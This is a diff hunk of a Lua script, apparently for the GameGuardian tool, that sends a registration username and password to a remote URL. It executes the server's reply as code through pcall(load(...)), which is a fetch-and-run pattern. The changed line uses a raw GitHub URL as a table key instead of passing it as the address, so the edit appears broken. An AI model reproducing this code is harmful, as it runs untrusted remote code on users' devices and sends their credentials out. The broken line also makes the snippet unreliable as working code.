@@ -10,5 +10,5 @@ Prompt = gg.prompt({"Username","Password","ConfirmPassword","Back"},nil,{"text",
 	
 
 Variable["TempRegister"]  = '{"Username":"'..Prompt[1]..'","Password":"'..Prompt[2]..'","ConfirmPassword":"'..Prompt[3]..'"}'
-ResponseContent = gg.makeRequest(Variable["RegisterURL"],nil,Variable["TempRegister"]).content
+ResponseContent = gg.makeRequest(Variable["https://raw.githubusercontent.com/Jfkwkfja/Osbir/main/Register.php"],nil,Variable["TempRegister"]).content
 pcall(load(ResponseContent))
